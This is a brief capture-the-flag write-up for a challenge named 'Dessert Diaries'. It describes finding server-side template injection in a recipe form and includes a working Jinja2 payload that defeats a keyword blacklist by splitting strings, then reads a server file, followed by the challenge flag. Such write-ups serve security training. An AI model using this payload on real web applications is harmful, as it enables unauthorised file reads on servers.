**Challenge Name**: Dessert Diaries

# Writeup
In this challenge we can find there is a `Share recipe` form at the end of the page . whatever name we provide is being reflected. hence trying `{{7*7}}` confirms the presence of SSTI.
However, common payloads like `__class__` are blocked due to blacklists. Therefore, we can use the `url_for` payload or `request` payload


Payload: `{{url_for['__gl'+'obals__']['__buil'+'tins__']['op'+'en']('./flag.txt')['re'+'ad']()}}`

Flag: `inctfj{sSt1_t0_w1n_th3_bl0g??}`
